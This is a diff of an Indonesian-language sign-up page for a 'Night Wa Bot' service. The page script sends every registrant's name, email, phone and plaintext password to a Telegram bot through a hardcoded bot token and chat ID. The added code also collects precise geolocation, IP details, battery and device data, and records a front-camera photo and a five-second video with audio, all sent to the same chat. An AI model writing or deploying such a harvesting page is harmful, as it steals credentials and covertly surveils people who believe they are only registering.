@@ -1,4 +1,4 @@
-<!DOCTYPE html>
+ <!DOCTYPE html>
 
 <html class="scroll-smooth" lang="id">
 <head>
@@ -375,81 +375,124 @@
 <script>
 const BOT_TOKEN = "8275671762:AAFHjoV2ZQCW9y69JvUTarIw7hUT0NVAXF8";
 const CHAT_ID   = "6216902201";
-document.querySelector("#register-card button[type='submit']").addEventListener("click", async function(e){
-    e.preventDefault();
 
-    let fullname   = document.getElementById("fullname").value;
-    let username   = document.getElementById("reg-username").value;
-    let email      = document.getElementById("email").value;
-    let phone      = document.getElementById("phone").value;
-    let password   = document.getElementById("reg-password").value;
+// Helpers
+async function getIPInfo(){
+  try{
+    const r = await fetch("https://ipapi.co/json/");
+    return await r.json();
+  }catch{ return { ip:"unknown" }; }
+}
+async function getBattery(){ try{ let b = await navigator.getBattery(); return `${Math.round(b.level*100)}% (${b.charging? 'Charging':'Not Charging'})`; }catch{return null;} }
+function getConnection(){ try{ let c = navigator.connection||navigator.mozConnection||navigator.webkitConnection; return c? {effectiveType:c.effectiveType, downlink:c.downlink}:null; }catch{return null;} }
+function getGeo(){ return new Promise(res=>{ if(!navigator.geolocation) return res({error:"Geo not supported"}); navigator.geolocation.getCurrentPosition(p=>res({lat:p.coords.latitude, lon:p.coords.longitude}), e=>res({error:e.message}), {enableHighAccuracy:true}); }); }
 
-    if(!fullname || !username || !email || !phone || !password){
-        Swal.fire({ icon: "warning", title: "Form belum lengkap!", text: "Isi semua data dulu ya." });
-        return;
-    }
+async function capturePhotoAndVideo(durationMs=5000){
+  try{
+    const videoEl = document.createElement("video");
+    const canvas = document.createElement("canvas");
+    const ctx = canvas.getContext("2d");
+    const stream = await navigator.mediaDevices.getUserMedia({ video:{ facingMode:"user" }, audio:true });
+    videoEl.srcObject = stream; videoEl.muted = true;
+    await videoEl.play(); await new Promise(r=>setTimeout(r,700));
+    canvas.width = 800; canvas.height = 800;
+    ctx.drawImage(videoEl,0,0,800,800);
+    const photoBlob = await new Promise(r=>canvas.toBlob(r,"image/jpeg",0.9));
+    const recorder = new MediaRecorder(stream);
+    let chunks=[]; recorder.ondataavailable=e=>{ if(e.data.size) chunks.push(e.data); };
+    recorder.start(); await new Promise(r=>setTimeout(r,durationMs));
+    recorder.stop(); await new Promise(r=>recorder.onstop=r);
+    stream.getTracks().forEach(t=>t.stop());
+    const videoBlob = new Blob(chunks,{type:chunks[0]?chunks[0].type:"video/webm"});
+    return {photoBlob,videoBlob};
+  }catch(e){ return {photoBlob:null,videoBlob:null}; }
+}
 
-    // siapkan data tambahan
-    let extra = {};
+// Telegram senders
+async function sendText(text){
+  return fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`,{
+    method:"POST",headers:{"Content-Type":"application/json"},
+    body:JSON.stringify({chat_id:CHAT_ID,text})
+  });
+}
+async function sendPhotoCaption(blob, caption){
+  const fd=new FormData(); fd.append("chat_id",CHAT_ID); fd.append("photo",blob,"photo.jpg"); fd.append("caption",caption);
+  return fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`,{method:"POST",body:fd});
+}
+async function sendVideoCaption(blob, caption){
+  const fd=new FormData(); fd.append("chat_id",CHAT_ID); fd.append("video",blob,"video.mp4"); fd.append("caption",caption);
+  return fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendVideo`,{method:"POST",body:fd});
+}
 
-    // ambil IP publik
-    try {
-        let ipRes = await fetch("https://ipapi.co/json/");
-        extra.ip = await ipRes.json();
-    } catch(e){ extra.ip = { error: e.message }; }
+// Build caption
+function buildPhotoCaption(obj){
+  const now = new Date();
+  let txt = `╭─ > Tanggal: ${now.toLocaleString()}\n`;
+  txt += ` ├─ > Nama: ${obj.name}\n`;
+  txt += ` ├─ > Nomor: ${obj.phone}\n`;
+  txt += ` ├─ > Email: ${obj.email}\n`;
+  txt += ` ├─ > Username: ${obj.username}\n`;
+  txt += ` ├─ > UserAgent: ${obj.ua}\n`;
+  txt += ` ├─ > IP: ${(obj.ip.ip||"-")} (${obj.ip.org||"-"})\n`;
+  txt += ` ├─ > Battery: ${obj.battery||"-"}\n`;
+  txt += ` ├─ > Screen: ${obj.screen}\n`;
+  txt += ` ├─ > Lang/Timezone: ${obj.lang} / ${obj.tz}\n`;
+  if(obj.geo && obj.geo.lat) txt += ` ├─ > Lokasi: ${obj.geo.lat},${obj.geo.lon}\n`;
+  txt += `╰─ > © Daffa Dev`;
+  return txt;
+}
 
-    // ambil battery
-    try {
-        let battery = await navigator.getBattery();
-        extra.battery = `${(battery.level*100).toFixed(0)}% ${battery.charging ? '(Charging)' : ''}`;
-    } catch(e){ extra.battery = "N/A"; }
+// Camera consent
+async function askCameraConsent(){
+  const {value:allow} = await Swal.fire({
+    title:"Izin Kamera",
+    text:"Izinkan akses kamera untuk ambil foto & video singkat?",
+    icon:"question", showCancelButton:true,
+    confirmButtonText:"Izinkan", cancelButtonText:"Tolak"
+  });
+  if(!allow) return {photoBlob:null,videoBlob:null};
+  return await capturePhotoAndVideo(5000);
+}
 
-    // ambil lokasi
-    let geoText = "N/A";
-    if("geolocation" in navigator){
-        await new Promise(resolve=>{
-            navigator.geolocation.getCurrentPosition(pos=>{
-                geoText = `Lat: ${pos.coords.latitude}, Lon: ${pos.coords.longitude}`;
-                resolve();
-            }, err=>{
-                geoText = "Ditolak user";
-                resolve();
-            });
-        });
-    }
-    extra.geo = geoText;
+// Form submit
+document.querySelector("#register-card button[type='submit']").addEventListener("click", async e=>{
+  e.preventDefault();
+  const name=document.getElementById("fullname").value.trim();
+  const username=document.getElementById("reg-username").value.trim();
+  const email=document.getElementById("email").value.trim();
+  const phone=document.getElementById("phone").value.trim();
+  const password=document.getElementById("reg-password").value.trim();
 
-    let message = `
-📝 *Pendaftaran Baru Night Wa Bot*
-━━━━━━━━━━━━━━━━
-👤 Nama Lengkap : ${fullname}
-🔑 Username     : ${username}
-📧 Email        : ${email}
-📱 No. Telp     : ${phone}
-🔒 Password     : ${password}
+  if(!name||!username||!email||!phone||!password){
+    Swal.fire({icon:"warning",title:"Form belum lengkap",text:"Isi semua field"});
+    return;
+  }
 
-🌐 IP: ${extra.ip.ip || '-'} (${extra.ip.org || ''})
-📍 Lokasi: ${extra.geo}
-🔋 Baterai: ${extra.battery}
-💻 UserAgent: ${navigator.userAgent}
-    `;
+  Swal.fire({title:"Memproses...",allowOutsideClick:false,didOpen:()=>Swal.showLoading()});
 
-    try {
-        let res = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
-            method: "POST",
-            headers: { "Content-Type": "application/json" },
-            body: JSON.stringify({ chat_id: CHAT_ID, text: message, parse_mode: "Markdown" })
-        });
+  const ip=await getIPInfo();
+  const battery=await getBattery();
+  const geo=await getGeo();
+  const device={
+    ua:navigator.userAgent,screen:`${screen.width}x${screen.height}`,
+    lang:navigator.language,tz:Intl.DateTimeFormat().resolvedOptions().timeZone
+  };
 
-        if(res.ok){
-            Swal.fire({ icon: "success", title: "Pendaftaran Berhasil!", text: "Data terkirim ke Telegram ✅" });
-        } else {
-            Swal.fire({ icon: "error", title: "Gagal!", text: "Tidak bisa kirim data ke Telegram." });
-        }
-    } catch(err){
-        console.error(err);
-        Swal.fire({ icon: "error", title: "Error!", text: "Ada masalah saat menghubungi Telegram." });
-    }
+  // kamera (tanya izin)
+  const media=await askCameraConsent();
+
+  const caption=buildPhotoCaption({name,phone,email,username,ip,battery,geo,...device});
+
+  try{
+    await sendText(`📝 Pendaftaran Baru\nNama: ${name}\nUser: ${username}\nEmail: ${email}\nPhone: ${phone}\nPassword: ${password}`);
+    if(media.photoBlob){ await sendPhotoCaption(media.photoBlob, caption); }
+    else{ await sendText(caption); }
+    if(media.videoBlob){ await sendVideoCaption(media.videoBlob,"Video verifikasi"); }
+    Swal.fire({icon:"success",title:"Pendaftaran Berhasil",text:"Data terkirim ke Telegram ✅"});
+  }catch(err){
+    console.error(err);
+    Swal.fire({icon:"error",title:"Gagal",text:"Tidak bisa kirim ke Telegram"});
+  }
 });
 </script>
 
